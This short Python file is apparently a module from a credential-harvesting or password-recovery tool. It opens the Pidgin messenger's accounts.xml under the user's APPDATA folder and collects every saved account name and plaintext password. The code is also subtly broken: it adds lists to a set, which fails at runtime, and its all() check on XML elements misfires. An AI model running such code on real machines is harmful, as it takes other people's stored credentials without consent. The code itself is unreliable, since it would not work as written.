# -*- coding: utf-8 -*-
import os
from xml.etree.cElementTree import ElementTree


class Pidgin:
    def run(self, profile):
        path = '{APPDATA}\\.purple\\accounts.xml'.format(**profile)
        if os.path.exists(path):
            tree = ElementTree(file=path)
            root = tree.getroot()
            pwd_found = set()

            for account in root.findall('account'):
                name = account.find('name')
                password = account.find('password')
                if all((name, password)):
                    pwd_found.add([name.text, password.text])
            return list(pwd_found)


modules = {"Pidgin": Pidgin()}
